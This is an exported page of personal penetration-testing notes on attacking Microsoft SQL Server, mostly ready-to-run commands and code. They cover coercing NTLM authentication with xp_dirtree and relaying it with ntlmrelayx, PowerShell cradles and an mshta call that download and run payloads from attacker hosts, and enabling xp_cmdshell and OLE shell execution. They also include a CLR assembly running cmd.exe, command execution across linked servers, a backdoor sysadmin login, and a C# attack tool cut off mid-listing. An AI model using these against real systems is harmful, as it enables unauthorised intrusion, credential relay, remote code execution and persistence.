<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>15-MSSQL attackss</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>15-MSSQL attackss</h1><br/><p><h2>MS SQL Enumeration</h2><ul><li></li></ul><div class="codebox"><pre>setspn <span style="color:#ff9d00;font-weight:700">-</span>T corp1 <span style="color:#ff9d00;font-weight:700">-</span>Q MSSQLSvc<span style="color:#ff9d00;font-weight:700">/*</span><br />. .<span style="color:#ff9d00;font-weight:700">\</span>GetUserSPNs.ps1</pre></div></p><p></p><p><a href="https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs">https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs</a></p><p><h2>MS SQL authentication</h2><ul><li>login1: kerberos based via tgs </li><li>stage 2 : login is mapped to a user account </li><li>if login account do not map any MSSQL user =&gt; guest account </li><li>eaach user has different roles<ul><li>sa: sysadmin role</li><li>guest : public role</li></ul></li><li>BUILTIN\Users group has access by default</li></ul></p><p></p><p></p><p><h2>UNC path injection</h2><ul><li>code execution</li><li>if we can force an sql server to connect to smb share that we control</li><li>EXEC master..xp_dirtree \&quot;\\\\192.168.49.51\\\\test\&quot;;</li><li>we receive Net-ntlm hash (challenge and response based on ntlm)</li><li>it could be cracked </li><li>However, the Net-NTLM hash cannot be used in a pass-the-hash attack, but we can relay it to a different computer. If the user is a local administrator on the target, we can obtain code execution.</li><li>requirement : smb signing disabled (by default only enabled on DC)</p><p></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># prepare </span><br /><span style="color:#0088ff;font-weight:400">## run.txt is our powershell runner</span><br /><span style="color:#0088ff;font-weight:400">$text</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.250/run.txt&#39;) | IEX&quot;</span><br /><span style="color:#0088ff;font-weight:400">$bytes</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetBytes(<span style="color:#0088ff;font-weight:400">$text</span>)<br /><span style="color:#0088ff;font-weight:400">$EncodedText</span> <span style="color:#ff9d00;font-weight:700">=</span> [Convert]<span style="color:#ff9d00;font-weight:700">::</span>ToBase64String(<span style="color:#0088ff;font-weight:400">$bytes</span>)<br /><span style="color:#0088ff;font-weight:400">$EncodedText</span><br /><br /><br /><br /><span style="color:#0088ff;font-weight:400"># exploit </span><br /><br />sudo ntlmrelayx.py <span style="color:#ff9d00;font-weight:700">--</span><span style="color:#00117f;font-weight:400">no-http-server</span> <span style="color:#ff9d00;font-weight:700">-</span>smb2support <span style="color:#ff9d00;font-weight:700">-</span>t <span style="color:#0088ff;font-weight:400">$target</span> <span style="color:#ff9d00;font-weight:700">-</span>c <span style="color:#333333;font-weight:400">&#39;powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIANQAwAC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA&#39;</span><br /><br /><span style="color:#0088ff;font-weight:400"># trigger </span><br />EXEC master..xp_dirtree <span style="color:#ff9d00;font-weight:700">\</span><span style="color:#3ad900;font-weight:400">&quot;\\\\$myip\\\\test\&quot;</span></pre></div><ul><li>2 options<ul><li>crack hashcat 5600</li><li>ntlmrelay</li></ul></li></ul></p><p></p><p></p><p><h2>Net-NTLM relay</h2><ul><li>netntlm hash cannot be used for pass the hash =&gt; we must relay it </li><li>need smb signing disabled (check via crackmapexec smb)</li><li>sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c &#39;powershell -e...&#39;</li></ul></p><p></p><p></p><p><h2>MSSQL Privilege escalation</h2></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># give all logins that allow imperosnation</span><br /><span style="color:#ff9d00;font-weight:700">SELECT</span> distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id <span style="color:#ff9d00;font-weight:700">=</span> b.principal_id <span style="color:#ff9d00;font-weight:700">WHERE</span> a.permission_name <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;IMPERSONATE&#39;</span><br /><span style="color:#0088ff;font-weight:400">## not necessarily logins that we can impersonate</span><br /><span style="color:#0088ff;font-weight:400"># impersoinate </span><br /><span style="color:#0088ff;font-weight:400">## only on trustworthy dbs (e.g msdb)</span><br /><span style="color:#0088ff;font-weight:400">## dbo user has role sysafdmin</span><br /><br />use msdb; EXECUTE AS USER <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;dbo&#39;</span>;<br /><span style="color:#0088ff;font-weight:400"># RCE via xp_cmdshell (disabled by default)</span><br />EXEC sp_configure <span style="color:#333333;font-weight:400">&#39;show advanced options&#39;</span>, <span style="color:#333333;font-weight:400">1</span>; RECONFIGURE; EXEC sp_configure <span style="color:#333333;font-weight:400">&#39;xp_cmdshell&#39;</span>, <span style="color:#333333;font-weight:400">1</span>; RECONFIGURE;<br />EXEC xp_cmdshell whoami<br /><br /><span style="color:#0088ff;font-weight:400"># alternative to xp_cmdshell (RCE on host operating system of sql server)</span><br /><span style="color:#0088ff;font-weight:400">## enable OLE objects </span><br />EXEC sp_configure <span style="color:#333333;font-weight:400">&#39;Ole Automation Procedures&#39;</span>, <span style="color:#333333;font-weight:400">1</span>;<br />RECONFIGURE;<br /><span style="color:#0088ff;font-weight:400">## run code </span><br />DECLARE @myshell <span style="color:#7f0044;font-weight:400">INT</span>; EXEC sp_oacreate <span style="color:#333333;font-weight:400">&#39;wscript.shell&#39;</span>, @myshell OUTPUT;<br />EXEC sp_oamethod @myshell, <span style="color:#333333;font-weight:400">&#39;run&#39;</span>, null, <span style="color:#333333;font-weight:400">&#39;$cmd&quot;&#39;</span>;<br /><span style="color:#0088ff;font-weight:400"># enum users </span><br /><span style="color:#ff9d00;font-weight:700">SELECT</span> SYSTEM_USER;</pre></div></p><p></p><p><h2>Custom Assemblies</h2><ul><li>• <small>•</small><strong><small> a different technique for RCE </small></strong></li><li><small> </small><strong><small> CREATE ASSEMBLY</small></strong><small> to import managed dll as an object inside sql sever and execute method </small></li></ul></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> Microsoft.SqlServer.Server;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Data.SqlTypes;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Diagnostics;<br /><br /><span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> StoredProcedures<br />{<br />    [Microsoft.SqlServer.Server.SqlProcedure]<br />    <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> cmdExec (SqlString execCommand)<br />    {<br />        Process proc = <span style="color:#ff9d00;font-weight:700">new</span> Process();<br />        proc.StartInfo.FileName = <span style="color:#3ad900;font-weight:400">@&quot;C:\Windows\System32\cmd.exe&quot;</span>;<br />        proc.StartInfo.Arguments = <span style="color:#7f0044;font-weight:400">string</span>.Format(<span style="color:#3ad900;font-weight:400">@&quot; /C {0}&quot;</span>, execCommand);<br />        proc.StartInfo.UseShellExecute = <span style="color:#ff0044;font-weight:400">false</span>;<br />        proc.StartInfo.RedirectStandardOutput = <span style="color:#ff0044;font-weight:400">true</span>;<br />        proc.Start();<br /><br />        SqlDataRecord <span style="color:#ff9d00;font-weight:700">record</span> = <span style="color:#ff9d00;font-weight:700">new</span> SqlDataRecord(<span style="color:#ff9d00;font-weight:700">new</span> SqlMetaData(<span style="color:#3ad900;font-weight:400">&quot;output&quot;</span>, System.Data.SqlDbType.NVarChar, <span style="color:#ff0044;font-weight:400">4000</span>));<br />        SqlContext.Pipe.SendResultsStart(<span style="color:#ff9d00;font-weight:700">record</span>);<br />        <span style="color:#ff9d00;font-weight:700">record</span>.SetString(<span style="color:#ff0044;font-weight:400">0</span>, proc.StandardOutput.ReadToEnd().ToString());<br />        SqlContext.Pipe.SendResultsRow(<span style="color:#ff9d00;font-weight:700">record</span>);<br />        SqlContext.Pipe.SendResultsEnd();<br /><br />        proc.WaitForExit();<br />        proc.Close();<br />    }<br />};</pre></div></p><p><ul><li>CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];</li><li>EXEC cmdExec &#39;whoami&#39;<ul><li># exec the newly created procedure</li></ul></li></ul></p><p></p><p></p><p><h2>Linked sql servers</h2></p><p><ul><li>• <small>• It is possible to link multiple SQL servers together in such a way that a query executed on one SQL server fetches data or</small></li></ul><small></small></p><p><small>performs an action on a different SQL server</small><ul><li><small>If the administrator chooses a specific SQL login and that login has sysadmin role membership, we would obtain sysadmin privileges on the linked SQL server. This will be the case even if we only have low privileged access on the original SQL server.*</small></li></ul></p><p></p><p><h2>MSSQL commands </h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#00. identify users ith spn on an Mssql server </span><br />GetUserSPNs.py <span style="color:#0088ff;font-weight:400">$domain</span><span style="color:#ff9d00;font-weight:700">/</span><span style="color:#0088ff;font-weight:400">$user</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#0088ff;font-weight:400">$password</span><br />netexec mssql <span style="color:#0088ff;font-weight:400">$ranges</span> <br /><br /><br /><span style="color:#0088ff;font-weight:400"># 01.enumerate: </span><br /><br /><span style="color:#0088ff;font-weight:400">## connect </span><br />mssqlclient.py <span style="color:#ff9d00;font-weight:700">-</span><span style="color:#00117f;font-weight:400">windows-auth</span> <span style="color:#0088ff;font-weight:400">$domain</span><span style="color:#ff9d00;font-weight:700">/</span><span style="color:#0088ff;font-weight:400">$user</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#0088ff;font-weight:400">$password</span>@<span style="color:#0088ff;font-weight:400">$target_server</span><br /><br /><span style="color:#0088ff;font-weight:400">## find sql version</span><br /><span style="color:#ff9d00;font-weight:700">select</span> version from openquery(<span style="color:#3ad900;font-weight:400">&quot;dc01&quot;</span>, <span style="color:#333333;font-weight:400">&#39;select @@version as version&#39;</span>)<br /><span style="color:#0088ff;font-weight:400">## user  enumeration</span><br /><span style="color:#0088ff;font-weight:400">### Enumerate login info</span><br /><span style="color:#ff9d00;font-weight:700">SELECT</span> SYSTEM_USER;<br /><br /><span style="color:#0088ff;font-weight:400">### Enumerate database username.</span><br /><span style="color:#ff9d00;font-weight:700">SELECT</span> USER_NAME();<br /><br /><span style="color:#0088ff;font-weight:400">### Enumerate if user is member of Public or Sysadmin. If role is one then true.</span><br /><span style="color:#ff9d00;font-weight:700">SELECT</span> IS_SRVROLEMEMBER(<span style="color:#333333;font-weight:400">&#39;public&#39;</span>);<br /><span style="color:#ff9d00;font-weight:700">SELECT</span> IS_SRVROLEMEMBER(<span style="color:#333333;font-weight:400">&#39;sysadmin&#39;</span>);<br /><br /><span style="color:#0088ff;font-weight:400">### impersonate and execute commands </span><br />exec_as_login sa<br />enable_xp_cmdshell<br />xp_cmdshell whoami<br /><span style="color:#0088ff;font-weight:400">### Force NTLM authentication for hash-grabbing or relaying</span><br />EXEC master..xp_dirtree <span style="color:#3ad900;font-weight:400">&quot;\192.168.49.51\share&quot;</span><br /><span style="color:#00117f;font-weight:400">impacket-ntlmrelayx</span>.py <span style="color:#ff9d00;font-weight:700">-</span>smb2support <span style="color:#ff9d00;font-weight:700">-</span>t <span style="color:#333333;font-weight:400">10.10</span>.<span style="color:#333333;font-weight:400">10.1</span> <span style="color:#ff9d00;font-weight:700">-</span>c <span style="color:#333333;font-weight:400">&#39;whoami /all&#39;</span> <span style="color:#333333;font-weight:400">-debug</span><br /><br /><span style="color:#0088ff;font-weight:400"># 02.linked services</span><br /><span style="color:#0088ff;font-weight:400">### enumerate linked servers </span><br />EXEC sp_linkedservers;<br /><span style="color:#0088ff;font-weight:400">### exec on first sql server</span><br />EXEC (<span style="color:#333333;font-weight:400">&#39;sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; reconfigure;&#39;</span>) AT DC01<br /><span style="color:#0088ff;font-weight:400">### inspect privs</span><br /><span style="color:#ff9d00;font-weight:700">Select</span> mylogin from openquery(<span style="color:#3ad900;font-weight:400">&quot;dc01&quot;</span>, <span style="color:#333333;font-weight:400">&#39;select mylogin from openquery(&quot;appsrv01&quot;,&#39;&#39;select SYSTEM_USER as mylogin&#39;&#39;)&#39;</span>)<br /><br /><span style="color:#0088ff;font-weight:400"># 03. persistence </span><br /><span style="color:#0088ff;font-weight:400">## if we run high security context on the linked server we can add an sa user as persistence mechanism</span><br />EXEC (<span style="color:#333333;font-weight:400">&#39;EXEC sp_addlogin &#39;&#39;youness&#39;&#39;, &#39;&#39;password123!&#39;&#39;&#39;</span>) at [SQL27];<br />EXEC (<span style="color:#333333;font-weight:400">&#39;EXEC sp_addsrvrolemember &#39;&#39;youness&#39;&#39;, &#39;&#39;sysadmin&#39;&#39;&#39;</span>) at [SQL27];<br /><br /><span style="color:#0088ff;font-weight:400"># 4. linked servers /rpc out </span><br /><span style="color:#0088ff;font-weight:400">## check rpcout is enabled if not enable it </span><br /><span style="color:#ff9d00;font-weight:700">select</span> <span style="color:#ff9d00;font-weight:700">*</span> from master..sysservers<br /><br />EXECUTE as LOGIN <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;bridge_dev&#39;</span>;EXEC (<span style="color:#333333;font-weight:400">&#39;sp_configure&#39;</span> <span style="color:#333333;font-weight:400">&#39;show advanced options&#39;&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;RECONFIGURE;&#39;</span>) AT [m3sqlw.m3c.local] <br /><br /><span style="color:#0088ff;font-weight:400">## linked server commands </span><br />EXECUTE(<span style="color:#333333;font-weight:400">&#39;xp_cmdshell whoami&#39;</span>) AT [m3sqlw.m3c.local];</pre></div></p><p></p><p><strong><h2>One Hop Double Hop/Triple Hop (sql links)</h2></strong><strong><h2></h2></strong></p><p><strong><h2></h2></strong><div class="codebox"><pre><br /><span style="color:#0088ff;font-weight:400"># 01 hop </span><br />EXECUTE AS LOGIN <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;dev_int&#39;</span>;  <br />EXEC (<span style="color:#333333;font-weight:400">&#39;EXECUTE AS LOGIN = &#39;&#39;sa&#39;&#39;;&#39;</span>) AT db02<br />EXEC (<span style="color:#333333;font-weight:400">&#39; sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; reconfigure; &#39;</span>) AT db02<br />EXEC (<span style="color:#333333;font-weight:400">&#39; sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; reconfigure; &#39;</span>) AT db02<br />EXEC (<span style="color:#333333;font-weight:400">&#39; xp_cmdshell &#39;&#39;&lt;your cmd here&gt;&#39;&#39; &#39;</span>) AT db02<br /><span style="color:#0088ff;font-weight:400"># 02 hops </span><br /><span style="color:#0088ff;font-weight:400">## impersonate user </span><br />EXECUTE AS LOGIN <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;$user&#39;</span><br /><span style="color:#0088ff;font-weight:400">## double exec </span><br />EXEC (<span style="color:#333333;font-weight:400">&#39;EXEC (&#39;&#39;sp_configure &#39;&#39;&#39;&#39;show advanced options&#39;&#39;&#39;&#39;, 1; reconfigure;&#39;&#39;) AT db01&#39;</span>) AT db02<br />EXEC (<span style="color:#333333;font-weight:400">&#39;EXEC (&#39;&#39;sp_configure &#39;&#39;&#39;&#39;xp_cmdshell&#39;&#39;&#39;&#39;, 1; reconfigure;&#39;&#39;) AT db01&#39;</span>) AT db02<br />EXEC (<span style="color:#333333;font-weight:400">&#39;EXEC (&#39;&#39;xp_cmdshell &#39;&#39;&#39;&#39;&lt;your cmd here&gt;&#39;&#39;&#39;&#39;&#39;&#39;) AT db01&#39;</span>) AT db02<br />EXEC (<span style="color:#333333;font-weight:400">&#39;EXEC (&#39;&#39;xp_cmdshell &#39;&#39;&#39;&#39;powershell -enc XXXXX&#39;&#39;&#39;&#39;&#39;&#39;) AT db01&#39;</span>) AT db02<br /><br /><span style="color:#0088ff;font-weight:400">## triple hop</span><br />EXECUTE AS LOGIN <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;dev_int&#39;</span>;  <br />EXEC (<span style="color:#333333;font-weight:400">&#39;EXEC (&#39;&#39;EXEC (&#39;&#39;&#39;&#39; sp_configure &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;show advanced options&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, 1; reconfigure; &#39;&#39;&#39;&#39;) AT db02 &#39;&#39;) AT db01&#39;</span>) AT db02<br />EXEC (<span style="color:#333333;font-weight:400">&#39;EXEC (&#39;&#39;EXEC (&#39;&#39;&#39;&#39; sp_configure &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;xp_cmdshell&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, 1; reconfigure; &#39;&#39;&#39;&#39;) AT db02 &#39;&#39;) AT db01&#39;</span>) AT db02<br />EXEC (<span style="color:#333333;font-weight:400">&#39;EXEC (&#39;&#39;EXEC (&#39;&#39;&#39;&#39; xp_cmdshell &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;your cmd here&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; &#39;&#39;&#39;&#39;) AT db02 &#39;&#39;) AT db01&#39;</span>) AT db02</pre></div></p><p></p><p></p><p><h2>PowerUpsql Commands </h2></p><p><div class="codebox"><pre><br /><span style="color:#0088ff;font-weight:400"># powershell enumeration</span><br /><span style="color:#ff9d00;font-weight:700">IEX</span> (<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).DownloadString(<span style="color:#333333;font-weight:400">&#39;http://192.168.49.51/PowerUpSQL.ps1&#39;</span>)<br /><span style="color:#0088ff;font-weight:400">## get sql servers on local domains </span><br /><span style="color:#00117f;font-weight:400">Get-SQLInstanceDomain</span> <span style="color:#ff9d00;font-weight:700">-</span>DomainController final.com |<span style="color:#00117f;font-weight:400">Get-SQLServerInfo</span> <span style="color:#333333;font-weight:400">-Verbose</span><br /><span style="color:#00117f;font-weight:400">Get-SQLInstanceDomain</span> <span style="color:#ff9d00;font-weight:700">-</span>DomainController dc01.corp2.com |<span style="color:#00117f;font-weight:400">Get-SQLServerInfo</span> <span style="color:#333333;font-weight:400">-Verbose</span><br /><span style="color:#0088ff;font-weight:400">## enumerate </span><br /><span style="color:#0088ff;font-weight:400">## get basic info</span><br /><span style="color:#00117f;font-weight:400">Get-SQLInstanceLocal</span> | <span style="color:#00117f;font-weight:400">Get-SQLServerInfo</span><br /><span style="color:#0088ff;font-weight:400">## vulnerability checking </span><br /><span style="color:#00117f;font-weight:400">Invoke-SQLAudit</span> <span style="color:#333333;font-weight:400">-Verbose</span>  <span style="color:#ff9d00;font-weight:700">-</span>Instance <span style="color:#0088ff;font-weight:400">$target</span><br /><span style="color:#00117f;font-weight:400">Invoke-SQLAudit</span> <span style="color:#333333;font-weight:400">-Verbose</span>  <span style="color:#ff9d00;font-weight:700">-</span>Instance WEB06<span style="color:#ff9d00;font-weight:700">\</span>SQLEXPRESS<br /><span style="color:#0088ff;font-weight:400">## dump database when having creds</span><br /><span style="color:#00117f;font-weight:400">Get-SQLInstanceDomain</span> <span style="color:#333333;font-weight:400">-Verbose</span> | <span style="color:#00117f;font-weight:400">Get-SQLConnectionTestThreaded</span> <span style="color:#333333;font-weight:400">-Verbose</span> <span style="color:#ff9d00;font-weight:700">-</span>Threads <span style="color:#333333;font-weight:400">10</span> <br /><span style="color:#00117f;font-weight:400">Invoke-SQLDumpInfo</span> <span style="color:#333333;font-weight:400">-Verbose</span> <span style="color:#ff9d00;font-weight:700">-</span>Instance sql01.corp.com<br /><span style="color:#0088ff;font-weight:400">## look for sql server links </span><br /><span style="color:#00117f;font-weight:400">Get-SqlServerLinkCrawl</span> <span style="color:#333333;font-weight:400">-Verbose</span> <span style="color:#ff9d00;font-weight:700">-</span>Instance sql01.corp.com <span style="color:#ff9d00;font-weight:700">-</span>username webapp11 <span style="color:#ff9d00;font-weight:700">-</span>password 89543dfGDFGH4d<br /><span style="color:#0088ff;font-weight:400"># enable xp_cmdshell</span><br /><span style="color:#00117f;font-weight:400">Get-SQLServerLinkCrawl</span> <span style="color:#ff9d00;font-weight:700">-</span>Instance CYWEBDW<span style="color:#ff9d00;font-weight:700">\</span>SQLEXPRESS <span style="color:#ff9d00;font-weight:700">-</span>Query <span style="color:#3ad900;font-weight:400">&quot;EXECUTE(&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;reconfigure;&#39;)&quot;</span><br /><span style="color:#00117f;font-weight:400">GET-SQLQUERY</span> <span style="color:#ff9d00;font-weight:700">-</span>Instance CYWEBDW<span style="color:#ff9d00;font-weight:700">\</span>SQLEXPRESS <span style="color:#ff9d00;font-weight:700">-</span>Query <span style="color:#3ad900;font-weight:400">&quot;EXECUTE(&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;RECONFIGURE;&#39;) AT [M3SQLW\SQLEXPRESS]&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400">## add user </span><br /><br /><span style="color:#0088ff;font-weight:400"># run commands </span><br /><span style="color:#00117f;font-weight:400">Get-SQLServerLinkCrawl</span> <span style="color:#ff9d00;font-weight:700">-</span>Instance CYWEBDW<span style="color:#ff9d00;font-weight:700">\</span>SQLEXPRESS <span style="color:#ff9d00;font-weight:700">-</span>Query <span style="color:#3ad900;font-weight:400">&quot;exec master..xp_cmdshell &#39;mshta.exe http://10.10.16.135:9002/HONV2oHvVg.hta&#39;&quot;</span><br /><br /><br /><br /><br /><br /><br /><span style="color:#0088ff;font-weight:400">## exec commands</span><br /><span style="color:#00117f;font-weight:400">Get-SQLQuery</span> <span style="color:#333333;font-weight:400">-Verbose</span> <span style="color:#ff9d00;font-weight:700">-</span>Instance sql01.corp.com <span style="color:#ff9d00;font-weight:700">-</span>Query <span style="color:#3ad900;font-weight:400">&quot;exec master..xp_cmdshell &#39;whoami&#39;&quot;</span>  <br /><br /><br /><span style="color:#0088ff;font-weight:400">## exec command on linked servers</span><br /><span style="color:#00117f;font-weight:400">GET-SQLQUERY</span> <span style="color:#ff9d00;font-weight:700">-</span>Instance M3SQLW<span style="color:#ff9d00;font-weight:700">\</span>SQLEXPRESS <span style="color:#ff9d00;font-weight:700">-</span>Query <span style="color:#3ad900;font-weight:400">&quot; EXECUTE(&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;RECONFIGURE;&#39;) &quot;</span><br /><span style="color:#00117f;font-weight:400">Get-SQLServerLinkCrawl</span> <span style="color:#ff9d00;font-weight:700">-</span>Instance CYWEBDW<span style="color:#ff9d00;font-weight:700">\</span>SQLEXPRESS <span style="color:#ff9d00;font-weight:700">-</span>Query <span style="color:#3ad900;font-weight:400">&quot;exec master..xp_cmdshell &#39;dir&#39;&quot;</span><br /></pre></div></p><p></p><p>(console app .Net framework and not .Net core)<ul><li>change to .net frramework 4.6.x</p><p></li></ul><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">using</span> System;<br /><span style="color:#ff9d00;font-weight:700">using</span> System.Data.SqlClient;<br /><br /><span style="color:#ff9d00;font-weight:700">namespace</span> MSSQL<br />{<br />    <span style="color:#ff9d00;font-weight:700">class</span> Program<br />    {<br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#7f0044;font-weight:400">string</span> sqlQuery(<span style="color:#7f0044;font-weight:400">string</span> query, SqlConnection con)<br />        {<br />            SqlCommand command = <span style="color:#ff9d00;font-weight:700">new</span> SqlCommand(query, con);<br />            SqlDataReader reader = command.ExecuteReader();<br />            <span style="color:#7f0044;font-weight:400">string</span> result = <span style="color:#3ad900;font-weight:400">&quot;&quot;</span>;<br />            <span style="color:#ff9d00;font-weight:700">try</span><br />            {<br />                <span style="color:#ff9d00;font-weight:700">while</span> (reader.Read()) { result += $<span style="color:#3ad900;font-weight:400">&quot;{reader[0]}\n&quot;</span>; }<br />                result = result.Remove(result.Length - <span style="color:#ff0044;font-weight:400">1</span>);<br />            }<br />            <span style="color:#ff9d00;font-weight:700">catch</span> { }<br />            reader.Close();<br />            <span style="color:#ff9d00;font-weight:700">return</span> result;<br />        }<br /><br />        <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main(<span style="color:#7f0044;font-weight:400">string</span>[] args)<br />        {<br />            <span style="color:#0088ff;font-weight:400">// Authenticate</span><br />            <span style="color:#7f0044;font-weight:400">string</span> sqlServer = <span style="color:#3ad900;font-weight:400">&quot;SQLSRV01.megacorp.local&quot;</span>;<br />            <span style="color:#7f0044;font-weight:400">string</span> database = <span style="color:#3ad900;font-weight:400">&quot;master&quot;</span>;<br />            <span style="color:#7f0044;font-weight:400">string</span> conString = $<span style="color:#3ad900;font-weight:400">&quot;Server = {sqlServer}; Database = {database}; Integrated Security = True;&quot;</span>;<br />            SqlConnection con = <span style="color:#ff9d00;font-weight:700">new</span> SqlConnection(conString);<br /><br />            <span style="color:#ff9d00;font-weight:700">try</span><br />            {<br />                con.Open();<br />                Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[+] Auth success!&quot;</span>);<br />            }<br />            <span style="color:#ff9d00;font-weight:700">catch</span><br />            {<br />                Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[-] Auth failed&quot;</span>);<br />                Environment.Exit(<span style="color:#ff0044;font-weight:400">0</span>);<br />            }<br /><br />            <span style="color:#0088ff;font-weight:400">// Enumerate login name (SQL Server login or Domain/Windows username)</span><br />            <span style="color:#7f0044;font-weight:400">string</span> result = sqlQuery(<span style="color:#3ad900;font-weight:400">&quot;SELECT SYSTEM_USER;&quot;</span>, con);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Logged in as: {result}&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Enumerate database username</span><br />            result = sqlQuery(<span style="color:#3ad900;font-weight:400">&quot;SELECT USER;&quot;</span>, con);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Mapped to the user: {result}&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Check if we have public role assigned</span><br />            result = sqlQuery(<span style="color:#3ad900;font-weight:400">&quot;SELECT IS_SRVROLEMEMBER(&#39;public&#39;);&quot;</span>, con);<br />            Int32 val = Int32.Parse(result.ToString());<br />            <span style="color:#ff9d00;font-weight:700">if</span> (val == <span style="color:#ff0044;font-weight:400">1</span>)<br />            {<br />                Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[*] User is a member of public role&quot;</span>);<br />            }<br />            <span style="color:#ff9d00;font-weight:700">else</span><br />            {<br />                Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;[*] User is NOT a member of public role&quot;</span>);<br />            }<br /><br />            <span style="color:#0088ff;font-weight:400">// Invoke xp_dirtree to coerce authentication on attacker&#39;s machine</span><br />            <span style="color:#7f0044;font-weight:400">string</span> lhost = args[<span style="color:#ff0044;font-weight:400">0</span>];<br />            sqlQuery($<span style="color:#3ad900;font-weight:400">@&quot;EXEC master..xp_dirtree &#39;\\{lhost}\test&#39;;&quot;</span>, con);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Invoked xp_dirtree against {lhost}&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Enumerate logins that we can impersonate</span><br />            result = sqlQuery(<span style="color:#3ad900;font-weight:400">&quot;SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#39;IMPERSONATE&#39;;&quot;</span>, con);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Logins that can be impersonated:\n{result}&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Impersonate sa user</span><br />            result = sqlQuery(<span style="color:#3ad900;font-weight:400">&quot;EXECUTE AS LOGIN = &#39;sa&#39;; SELECT SYSTEM_USER;&quot;</span>, con);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Executing in context of impersonated user: {result}&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Impersonate dbo database user</span><br />            result = sqlQuery(<span style="color:#3ad900;font-weight:400">&quot;use msdb; EXECUTE AS USER = &#39;dbo&#39;; SELECT USER;&quot;</span>, con);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;[*] Executing in context of impersonated login: {result}&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Execute OS commands via xp_cmdshell</span><br />            sqlQuery(<span style="color:#3ad900;font-weight:400">&quot;EXECUTE AS LOGIN = &#39;sa&#39;;&quot;</span>, con);<br />            sqlQuery(<span style="color:#3ad900;font-weight:400">&quot;EXEC sp_configure &#39;show advanced options&#39;,1; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;,1; RECONFIGURE;&quot;</span>, 